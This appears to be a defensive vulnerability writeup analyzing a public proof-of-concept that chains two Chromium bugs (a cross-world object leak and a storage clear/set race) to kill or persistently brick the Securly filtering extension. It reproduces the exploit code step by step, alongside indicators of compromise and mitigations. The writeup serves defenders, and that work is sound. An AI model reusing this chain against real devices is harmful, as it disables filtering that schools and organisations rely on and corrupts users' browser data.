# Security Writeup — Bricking the Securly Chrome Extension via Cross-World Object Leak + `StorageArea::clear` Memory Corruption

| Field | Value |
|---|---|
| **Document type** | Vulnerability analysis / exploit teardown |
| **Target** | Securly filtering extension (Chromium / ChromeOS managed devices) |
| **Underlying browser bugs** | `crbug.com/141375378`, `crbug.com/141373198` |
| **Affected components** | Blink/V8 isolated worlds (extension content-script worlds); `chrome.storage` backend (`StorageArea::clear`) |
| **Attack vector** | Arbitrary web page + user interaction (clicking the PoC UI) |
| **Impact** | DoS against a force-installed extension: session kill, persistent disable ("brick"), corruption of extension-owned storage |
| **Prerequisites** | Chromium with the target extension installed; page JS execution; an origin-scoped Origin Trial token (Bug A) |
| **Status** | Public PoC in circulation; underlying browser bugs tracked and fixed in subsequent Chromium releases |

---

## 1. Executive Summary

The analyzed script is a proof-of-concept exploit chain that disables the Securly content-filtering
extension from an unprivileged web page. It chains two Chromium bugs:

1. **Bug A — `crbug.com/141375378`** (*InlineContentScripts Origin Trial allows cross-world object
   access*): used to break Chrome's **isolated-world** boundary and obtain a live object reference
   into the extension's content-script world, granting the page access to extension-granted APIs
   (`chrome.storage.local`, `chrome.extension.setUpdateUrlData`, `chrome.runtime.id`).
2. **Bug B — `crbug.com/141373198`** (*Possible memory corruption via `StorageArea::clear`*): used to
   corrupt the browser's extension-storage backend by racing overlapping `clear()` / `set()`
   operations over a heap-shaped, quota-saturated storage area containing crafted raw-pointer keys.

The end result is a corrupted storage backend and/or crashed extension process. Depending on the
selected mode, the extension dies for the current session (`normal`), stays broken across reboots
(`perma`), or the damage is flushed and reversed (`undo`).

### Exploit chain at a glance

```
[unprivileged page JS]
   |  (0) WAR oracle: <img src="chrome-extension://<id>/tt-alert.svg"> for 5 known IDs
   v
 target extension ID confirmed
   |  (1) inject <meta http-equiv="origin-trial">  -> arms buggy OT feature on this origin
   v
 (2) prototype shadowing + 32k-call deopt loop  -> leaks object from extension's isolated world
   |     app_.constructor.constructor  ->  that world's Function constructor
   v
 (3) new Function_("return this")()  ->  window_  (extension content-script global object)
   |     verify: window_.chrome.runtime.id === detected ID   (retry up to 20x otherwise)
   v
 (4) heap shaping: fill chrome.storage.local to exactly QUOTA_BYTES (10 MiB, 1024 uniform entries)
   |
 (5) poison: write 688 keys embedding raw tagged pointers (4-byte aligned, LSB=1), value null
   v
 (6) trigger: overlapping clear() -> set() -> clear() cascades   (Bug B race)
   |     + chrome.extension.setUpdateUrlData("€" x 1024) as secondary destabilizer
   v
 storage backend corruption / extension process crash
   = extension killed (session)  or  bricked (persistent)  or  restored (undo)
```

---

## 2. Background

### 2.1 Isolated worlds
Chrome runs extension content scripts in a JavaScript realm ("isolated world") separate from the
page's realm. The DOM is shared, but JS objects, globals, and privileged `chrome.*` bindings are
not. A page normally has **no** way to obtain a reference to any object belonging to an extension's
world — that boundary is the core security property this exploit breaks.

### 2.2 Origin Trials
Origin Trials (OT) let origins opt into experimental browser features via a signed token delivered
in an HTTP header or `<meta http-equiv="origin-trial">` tag. Tokens are **origin-scoped**, which is
why the PoC contains the placeholder comment `"[PUT YOUR OWN TOKEN HERE...]"` — the attacker must
register their own origin to arm the vulnerable feature.

### 2.3 `chrome.storage.local`
Extension storage is a quota-limited key/value area (`QUOTA_BYTES = 10,485,760` bytes) backed by an
on-disk database (LevelDB-based) in the user profile. Content scripts of an extension with the
`storage` permission can read/write/clear it. `clear()` and `set()` are asynchronous and, prior to
the fix for Bug B, could be driven into a memory-corruption state when overlapped.

---

## 3. Vulnerability Details

### 3.1 Bug A — cross-world object access (crbug.com/141375378)
The *InlineContentScripts* Origin Trial inadvertently allowed objects to cross the isolated-world
boundary. With the trial armed on the attacker's origin, the page can confuse the engine into
handing back an object whose owning realm is the **extension's content-script world** instead of
the page world. The PoC stabilizes this leak with a V8 de-optimization trick (see §4, Step 2).
Once any object from the victim world is held, walking `obj.constructor.constructor` yields that
world's `Function` constructor, and `new Function_("return this")()` executes *inside* the victim
realm, returning its global object — full access to everything exposed to content scripts.

### 3.2 Bug B — memory corruption in `StorageArea::clear` (crbug.com/141373198)
The storage backend's `clear()` implementation could be driven into a memory-unsafe state
(iterator invalidation / use-after-free class of issue) when clear and set operations overlap on a
large, carefully shaped storage area. The PoC maximizes reliability by:

* saturating the area to **exactly** the quota with uniform-size entries (predictable allocations),
* embedding **crafted raw pointers** in keys so corrupted metadata dereferences attacker-chosen,
  sandbox-valid tagged offsets,
* re-firing the clear/set/clear cascade many times (up to 1000 rounds).

> **Analysis note:** the precise internal root cause of 141373198 is not publicly documented; the
> above reflects the observable contract of the PoC (quota-exact fill, tagged-pointer keys,
> overlapping clear/set) rather than confirmed engine internals.

---

## 4. Exploit Chain Walkthrough

### Step 0 — Target fingerprinting (WAR oracle)
```js
let img = new Image();
img.src = `chrome-extension://${id}/tt-alert.svg`;
img.onload = () => res(id);
```
`Promise.any` races image loads against five hardcoded Securly extension IDs with a 500 ms timeout.
A page may only load `chrome-extension://` resources that the extension declares as
**web_accessible_resources**, so a successful load both *detects* the extension and *identifies*
which ID is installed. (`force = true` skips detection and assumes `ids[0]`.)

### Step 1 — Arming the Origin Trial
```js
meta.httpEquiv = "origin-trial";
meta.content = "<attacker token>";
```
A `<meta>` tag is created/overwritten at runtime to enable the vulnerable InlineContentScripts
trial on the current origin (Bug A precondition). Tokens are origin-bound, hence the placeholder.

### Step 2 — Cross-world primitive via prototype shadowing + deopt
```js
let warmup = { chrome: { app: null } };
warmup.__proto__ = window.__proto__;
function app(w) { return w?.chrome?.app ?? {}; }
for (let i = 0; i < 0x8000; i++) app(warmup);   // "Deoptimization happens here"
let app_ = app(window);
```
`warmup` shadows `chrome` with an own property while inheriting the page global's prototype, so
`app()` is trained megamorphically across two different `chrome` shapes for 32,768 iterations.
After the induced deopt, the call `app(window)` misresolves the property/inline-cache lookup under
the armed OT bug and returns `chrome.app` **from the extension's isolated world** instead of the
page's.

### Step 3 — Realm capture, verification, retry
```js
let Function_ = app_.constructor.constructor;      // victim world's Function
let window_   = new Function_("return this;")();   // victim world's global
if (!window_ || app(window_) !== app_) return errors.PROTO_WALK_FAILED;
let id_ = window_.chrome?.runtime?.id;
if (typeof id_ === "string" && id_ !== correctId) return exp(mode, attempts - 1, force);
```
The constructor walk converts the leaked object into code execution inside the victim realm.
Two sanity gates follow: the captured global must reproduce the same `chrome.app` reference, and
`chrome.runtime.id` must match the detected Securly ID (otherwise the leak landed in some *other*
extension's world — retry, up to 20 attempts). If `new Function` throws (CSP eval block), the run
aborts with `EVAL_FAILED`.

### Step 4 — Heap shaping: quota-exact saturation
```js
let filler = "A".repeat(10202);
for (let i = 0; i < 1024; i++) cookies[crypto.randomUUID()] = filler;
// 1024 * (10202 + 36 + 2) = 10,485,760 = QUOTA_BYTES
```
1,024 uniform entries (36-char UUID key + 10,202-char value + 2 bytes serialization overhead)
fill `chrome.storage.local` to **exactly** its 10 MiB quota. Uniform, maximal allocation makes the
backend's memory layout predictable and forces `clear()` to traverse the largest possible live set
when the race fires.

### Step 5 — Poisoning keys with tagged pointers
```js
for (let i = 536; i < 1224; i++) {
    let n = (i * 4) | 1;                       // 4-byte aligned, LSB tag set
    let pointer = String.fromCharCode((n>>>24)&0xff, (n>>>16)&0xff, (n>>>8)&0xff, n&0xff);
    let key = "\u{10FFFF}".repeat(3) + "\0" + pointer;
    cookies[key] = null;
}
```
688 entries whose keys embed raw 4-byte big-endian values. `(i*4)|1` produces sandbox-valid
**tagged pointers** (4-byte alignment with the low tag bit set, matching Chromium's pointer-tagging
conventions); the `U+10FFFF` run forces a wide-string storage path so the raw bytes survive
intact, and the embedded `NUL` perturbs string termination handling. When the buggy `clear()`
processes this poisoned key set, these bytes are positioned to be interpreted as
pointers/offsets inside the backend's own structures.

### Step 6 — Trigger: overlapping clear/set/clear cascade
```js
window_.chrome.storage.local.clear().finally(() => {
    window_.chrome.storage.local.set(cookies).finally(() => {
        window_.chrome.storage.local.clear();
    });
});
```
Three storage operations are nested through `.finally()` so that a `clear()` executes while a
`set()` of the 10 MiB poisoned payload is still in flight — the race window of Bug B. Repeat
count: **1** in `normal` mode, **1000** rounds at 1.8 s intervals in `perma`/`undo` modes
(~30 minutes of sustained pressure).

### Step 7 — Secondary destabilizer
```js
window_.chrome.extension.setUpdateUrlData("€".repeat(1024));
```
Passes 1,024 non-ASCII characters (3,072 bytes in UTF-8) to an API documented with a ~1 KiB data
ceiling — a char-vs-byte length confusion used as an extra corruption/crash vector against the
extension's update machinery (the PoC notes it throws on some builds).

### Step 8 — Author phone-home (telemetry)
```js
let url = `https://analytics.google.com/collect?v=1&t=pageview&tid=G-Z5NT64X8FG&cid=322&ec=exploit&ea=${mode}&el=${extensionId}`;
```
Every run reports mode and victim extension ID to a Google Analytics property via a hidden iframe.
Not part of the vulnerability, but a useful **IOC** — and a privacy issue for anyone running the tool.

---

## 5. Mode Semantics

| Mode | Writes filler + pointer payload? | Race repeats | Intended effect |
|---|---|---|---|
| `normal` | Yes | 1 | Kill Securly for the current session only |
| `perma`  | Yes | 1000 (~30 min) | Land corruption that persists to the on-disk profile → extension stays broken across reboots ("hard disable") |
| `undo`   | **No** | 1000 (~30 min) | Repeated clean `clear/set({})/clear` cycles flush/overwrite the poisoned records → recovery path back to a working extension |

The UI (`#normal`, `#perma`, `#undo` buttons + jQuery modal) merely wraps these modes with retry
logic and human-readable status messages.

---

## 6. Why the Extension Actually Dies

* **Session kill (`normal`):** the raced `clear()` corrupts the in-memory `StorageArea` state or
  crashes the extension's process/service worker. Chrome tears down the faulting extension context;
  with Securly's filtering logic offline, the device is unfiltered until restart.
* **Persistent brick (`perma`):** sustained rounds increase the chance that poisoned records or
  corrupted metadata are **committed to the on-disk profile database**. On subsequent launches the
  extension fails during storage initialization (crash loop / load failure), so it remains disabled
  across reboots until the profile is repaired — hence the "wait ~30 minutes" guidance, which
  matches commit/flush and policy re-evaluation cadence.
* **Recovery (`undo`):** by skipping the payload write and hammering clean clear/set cycles, the
  corrupted entries are overwritten and flushed, letting the extension reload normally.

---

## 7. Detection / Indicators of Compromise

1. **Network/DOM:** hidden-iframe beacons to
   `analytics.google.com/collect?...tid=G-Z5NT64X8FG&...&ec=exploit&ea=<mode>&el=<extId>`.
2. **Recon:** bursts of failed/succeeded image loads of
   `chrome-extension://<id>/tt-alert.svg` across multiple extension IDs.
3. **DOM:** runtime injection of `<meta http-equiv="origin-trial">` on pages not shipping one.
4. **Storage telemetry:** extension storage saturating to exactly 10,485,760 bytes with
   high-entropy UUID keys and 10,202-char uniform values; keys containing
   `U+10FFFF U+10FFFF U+10FFFF NUL <raw bytes>`.
5. **Behavior:** rapid `clear → set → clear` cascades on `chrome.storage.local`, especially
   ~1.8 s-periodic repetition for ~30 minutes; repeated extension process crashes coinciding with
   storage corruption.

---

## 8. Mitigation & Hardening

**Browser / fleet level**
- Update Chromium past the fixes for both referenced bugs; on managed Chromebook fleets enforce
  auto-update and monitor version compliance — this entire chain dies on a patched browser.
- Review Origin Trial exposure on managed fleets; the attack requires arming an experimental
  feature token on the attacker origin.

**Extension level (defense-in-depth for vendors like Securly)**
- Minimize `web_accessible_resources`: the `tt-alert.svg` oracle is what makes detection trivial.
  Unexposed resources remove Step 0.
- Avoid shipping/participating in experimental Origin Trials with known isolation implications.
- Self-healing storage: on startup, validate keys (reject NUL / non-character codepoints /
  unexpected widths) and purge malformed entries before use.
- Serialize storage mutations (mutex around `clear`/`set`) and keep quota headroom to shrink the
  race window and defeat quota-exact grooming.
- Crash-loop watchdog: detect repeated storage-init failures and trigger profile repair /
  re-registration instead of staying bricked.

---

## 9. References

- `crbug.com/141373198` — *Possible memory corruption via `StorageArea::clear`* (Bug B).
- `crbug.com/141375378` — *InlineContentScripts Origin Trial allows cross-world object access* (Bug A).
- Chrome for Developers: `StorageArea` API reference; Origin Trials developer guide; extension
  isolated-worlds documentation.
- Analyzed artifact: public PoC script (UI-wrapped, modes `normal`/`perma`/`undo`).

---

## 10. Disclaimer

This document is a defensive/educational analysis of a publicly circulating proof-of-concept and
its underlying patched browser vulnerabilities. Tampering with filtering or monitoring software on
managed devices violates acceptable-use policies and potentially law. The intended audience is
browser vendors, extension developers, and school/enterprise IT defenders building detection and
hardening measures.
